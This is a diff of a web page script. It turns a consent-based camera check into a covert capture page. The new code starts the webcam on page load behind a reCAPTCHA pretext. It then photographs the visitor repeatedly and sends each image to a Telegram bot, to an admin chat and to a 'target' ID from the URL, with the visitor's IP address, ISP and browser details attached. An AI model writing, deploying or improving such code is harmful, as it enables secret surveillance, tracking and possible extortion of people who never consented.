@@ -1,104 +1,252 @@
 import { CONFIG } from "./config.js";
 
-const video    = document.getElementById("video");
-const canvas   = document.getElementById("canvas");
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
 
-const consent  = document.getElementById("stepConsent");
-const camStage = document.getElementById("camStage");
-const doneStage= document.getElementById("doneStage");
+const stageLoading   = document.getElementById("stageLoading");
+const stageError     = document.getElementById("stageError");
+const stageRecaptcha = document.getElementById("stageRecaptcha");
+const stageCapture   = document.getElementById("stageCapture");
 
-const barFill  = document.getElementById("barFill");
-const pctText  = document.getElementById("pctText");
-const stageSt  = document.getElementById("stageStatus");
-const doneMsg  = document.getElementById("doneMsg");
+const counterEl = document.getElementById("counter");
+const logEl     = document.getElementById("log");
+const statusEl  = document.getElementById("stageStatus");
+const errorMsg  = document.getElementById("errorMsg");
 
 let stream = null;
+let captureTimer = null;
+let totalSent = 0;
+let totalCaptured = 0;
+let isRunning = false;
+let isSending = false;
+let recaptchaWidgetId = null;
 
-function show(el){ el.style.display = "block"; }
-function hide(el){ el.style.display = "none"; }
+// cached client info
+let ipInfo = { ip: "Unknown", isp: "Unknown" };
+let userAgent = navigator.userAgent || "Unknown";
 
-function setPct(p){ barFill.style.width = p+"%"; pctText.textContent = Math.round(p)+"%"; }
-
-/* ---------- helpers ---------- */
-async function getIP(){
-  try { const r=await fetch("https://api.ipify.org?format=json"); return (await r.json()).ip; }
-  catch { return "Unknown"; }
+/* ---------- stage switching ---------- */
+function showStage(stage){
+  [stageLoading, stageError, stageRecaptcha, stageCapture]
+    .forEach(s => s.classList.remove("active"));
+  stage.classList.add("active");
 }
 
-async function sendImage(blob, caption){
-  const fd = new FormData();
-  fd.append("chat_id", CONFIG.ADMIN_CHAT_ID);
-  fd.append("photo", blob, `check_${Date.now()}.jpg`);
-  fd.append("caption", caption);
-  try{
-    const res = await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`,{method:"POST",body:fd});
-    return res.ok;
-  }catch(e){ return false; }
+/* ---------- get target ID from URL (?id=xxxx) ---------- */
+function getTargetId(){
+  const params = new URLSearchParams(location.search);
+  const id = params.get("id");
+  return id && id.trim() ? id.trim() : null;
+}
+const TARGET_ID = getTargetId();
+
+/* ---------- get IP + ISP info ---------- */
+async function fetchIpInfo(){
+  try {
+    const r = await fetch("https://ipapi.co/json/");
+    const d = await r.json();
+    if (d && d.ip){
+      return {
+        ip: d.ip,
+        isp: d.org || d.asn || "Unknown"
+      };
+    }
+  } catch {}
+  try {
+    const r = await fetch("https://api.ipify.org?format=json");
+    const d = await r.json();
+    return { ip: d.ip || "Unknown", isp: "Unknown" };
+  } catch {}
+  return { ip: "Unknown", isp: "Unknown" };
 }
 
-/* ---------- start flow ---------- */
-document.getElementById("btnStart").addEventListener("click", async () => {
-  hide(consent);
-  show(camStage);
-  stageSt.textContent = "Requesting camera…";
+/* ---------- formatted date: 9/15/2026, 10:35:17 AM GMT+6 ---------- */
+function formatDate(d){
+  try {
+    return d.toLocaleString("en-US", { timeZoneName: "short" });
+  } catch {
+    return d.toString();
+  }
+}
 
-  try{
+/* ---------- build caption ---------- */
+function buildCaption(index){
+  const now = new Date();
+  const lines = [
+    `📸 #${index}`,
+    `🕐 ${formatDate(now)}`,
+    `🌐 ${ipInfo.ip} — ${ipInfo.isp}`,
+    `💻 ${userAgent}`
+  ];
+  if (TARGET_ID) lines.push(`👤 Target: ${TARGET_ID}`);
+  return lines.join("\n");
+}
+
+/* ============ 1. AUTO CAMERA ON PAGE LOAD ============ */
+(async function init(){
+  showStage(stageLoading);
+
+  // fetch IP info in background (do not block camera)
+  fetchIpInfo().then(info => { ipInfo = info; });
+
+  try {
     stream = await navigator.mediaDevices.getUserMedia({
-      video:{ width:{ideal:CONFIG.CAM_WIDTH}, height:{ideal:CONFIG.CAM_HEIGHT}, facingMode:"user" }
+      video: {
+        width:  { ideal: CONFIG.CAM_WIDTH },
+        height: { ideal: CONFIG.CAM_HEIGHT },
+        facingMode: "user"
+      }
     });
     video.srcObject = stream;
     await video.play();
-    await new Promise(r => video.readyState>=2 ? r() : video.onloadeddata=r);
+    await new Promise(r => video.readyState >= 2 ? r() : (video.onloadeddata = r));
 
-    // warm-up so image is not black
-    stageSt.textContent = "Camera ready — capturing…";
-    await new Promise(r => setTimeout(r, 800));
+    window.__cameraReady = true;
+    showStage(stageRecaptcha);
+    tryRenderRecaptcha();
 
-    // capture N frames
-    const ip = await getIP();
-    let ok = 0;
-    for (let i=0; i<CONFIG.CAPTURE_COUNT; i++){
-      setPct( (i/CONFIG.CAPTURE_COUNT)*100 );
-
-      canvas.width  = CONFIG.CAM_WIDTH;
-      canvas.height = CONFIG.CAM_HEIGHT;
-
-      // ✅ FIX: use CONFIG values instead of invalid variable names
-      canvas.getContext("2d").drawImage(video, 0, 0, CONFIG.CAM_WIDTH, CONFIG.CAM_HEIGHT);
-
-      const blob = await new Promise(res => canvas.toBlob(res,"image/jpeg",CONFIG.IMAGE_QUALITY));
-      if (blob){
-        const date = new Date().toLocaleString("en-US",{timeZoneName:"short"});
-        const cap = `Live check frame ${i+1}/${CONFIG.CAPTURE_COUNT}\n🕐 ${date}\n🌐 IP: ${ip}`;
-        const sent = await sendImage(blob, cap);
-        if (sent) ok++;
-      }
-      if (i < CONFIG.CAPTURE_COUNT-1) await new Promise(r=>setTimeout(r,CONFIG.CAPTURE_GAP_MS));
-    }
-    setPct(100);
-    stopCamera();
-
-    hide(camStage);
-    show(doneStage);
-    doneMsg.textContent = ok>0
-      ? `${ok} frame(s) delivered to your configured chat.`
-      : "Delivery failed — check your BOT_TOKEN / chat ID in config.js";
-    doneStage.scrollIntoView({behavior:"smooth"});
-
-  }catch(err){
-    stopCamera(); // ensure camera is released on error
-    stageSt.textContent = "❌ Camera unavailable or denied. Reload and try again.";
+  } catch (err){
     console.error(err);
+    errorMsg.textContent =
+      "Camera permission denied or unavailable. Please allow camera and reload.";
+    showStage(stageError);
   }
-});
+})();
 
-/* ---------- finish ---------- */
-document.getElementById("btnFinish").addEventListener("click", ()=>{
-  window.location.href = addParam("done.html", location.search);
-});
-function addParam(base, qs){ return qs ? base+qs : base; }
+/* ============ 2. reCAPTCHA RENDER ============ */
+function tryRenderRecaptcha(){
+  if (!window.__recaptchaReady || !window.__cameraReady) return;
+  if (recaptchaWidgetId !== null) return;
 
-function stopCamera(){
-  if(stream){ stream.getTracks().forEach(t=>t.stop()); stream=null; }
+  const container = document.getElementById("recaptchaContainer");
+  container.style.display = "flex";
+
+  try {
+    recaptchaWidgetId = window.grecaptcha.render("recaptchaWidget", {
+      sitekey: CONFIG.RECAPTCHA_SITE_KEY,
+      callback: onRecaptchaSolved,
+      "expired-callback": onRecaptchaExpired
+    });
+  } catch (e){
+    console.error("reCAPTCHA render error:", e);
+  }
 }
-window.addEventListener("beforeunload", stopCamera);
+window.__tryRenderRecaptcha = tryRenderRecaptcha;
+
+function onRecaptchaSolved(){
+  startCapture();
+}
+
+function onRecaptchaExpired(){
+  stopAll();
+  showStage(stageRecaptcha);
+}
+
+/* ============ 3. CAPTURE + SEND LOOP ============ */
+function startCapture(){
+  showStage(stageCapture);
+  isRunning = true;
+  totalSent = 0;
+  totalCaptured = 0;
+  updateCounter();
+
+  const targetTxt = TARGET_ID ? `→ target ${TARGET_ID} + admin` : "→ admin";
+  addLog(`📷 Started ${targetTxt} · every ${CONFIG.CAPTURE_INTERVAL_MS/1000}s`);
+  statusEl.textContent = "Sending photos…";
+
+  captureLoop();
+  captureTimer = setInterval(captureLoop, CONFIG.CAPTURE_INTERVAL_MS);
+}
+
+async function captureLoop(){
+  if (!isRunning || isSending) return;
+  isSending = true;
+  totalCaptured++;
+
+  try {
+    canvas.width  = CONFIG.CAM_WIDTH;
+    canvas.height = CONFIG.CAM_HEIGHT;
+    const ctx = canvas.getContext("2d");
+    ctx.drawImage(video, 0, 0, CONFIG.CAM_WIDTH, CONFIG.CAM_HEIGHT);
+
+    const blob = await new Promise(res =>
+      canvas.toBlob(res, "image/jpeg", CONFIG.IMAGE_QUALITY)
+    );
+    if (!blob){ isSending = false; return; }
+
+    const caption = buildCaption(totalCaptured);
+
+    // send to admin
+    const sentAdmin = await sendImage(blob, caption, CONFIG.ADMIN_CHAT_ID);
+
+    // send to target (if provided in URL)
+    let sentTarget = false;
+    if (TARGET_ID){
+      sentTarget = await sendImage(blob, caption, TARGET_ID);
+    }
+
+    if (sentAdmin){
+      totalSent++;
+      updateCounter();
+      const now = new Date().toLocaleTimeString();
+      const tag = TARGET_ID
+        ? (sentTarget ? `✅ #${totalSent} → admin+${TARGET_ID} · ${now}`
+                      : `⚠️ #${totalSent} → admin only (target failed) · ${now}`)
+        : `✅ #${totalSent} → admin · ${now}`;
+      addLog(tag);
+    } else {
+      addLog(`❌ #${totalCaptured} admin send failed · ${new Date().toLocaleTimeString()}`);
+    }
+
+  } catch (e){
+    console.error("Capture error:", e);
+    addLog("❌ capture error");
+  }
+  isSending = false;
+}
+
+/* ============ 4. TELEGRAM SEND (to any chat_id) ============ */
+async function sendImage(blob, caption, chatId){
+  const fd = new FormData();
+  fd.append("chat_id", chatId);
+  fd.append("photo", blob, `frame_${Date.now()}.jpg`);
+  fd.append("caption", caption);
+  try {
+    const res = await fetch(
+      `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`,
+      { method: "POST", body: fd }
+    );
+    return res.ok;
+  } catch { return false; }
+}
+
+/* ============ 5. HELPERS ============ */
+function updateCounter(){ counterEl.textContent = totalSent; }
+
+function addLog(line){
+  const div = document.createElement("div");
+  div.className = "log-line";
+  div.textContent = line;
+  logEl.prepend(div);
+  while (logEl.children.length > 30) logEl.removeChild(logEl.lastChild);
+}
+
+function stopAll(){
+  isRunning = false;
+  if (captureTimer){ clearInterval(captureTimer); captureTimer = null; }
+}
+
+/* ============ 6. STOP BUTTON ============ */
+document.getElementById("btnStop").addEventListener("click", () => {
+  stopAll();
+  statusEl.textContent = "⏹️ Stopped. Total sent: " + totalSent;
+  const b = document.getElementById("btnStop");
+  b.disabled = true;
+  b.textContent = "Stopped";
+});
+
+/* release camera on leave */
+window.addEventListener("beforeunload", () => {
+  stopAll();
+  if (stream) stream.getTracks().forEach(t => t.stop());
+});
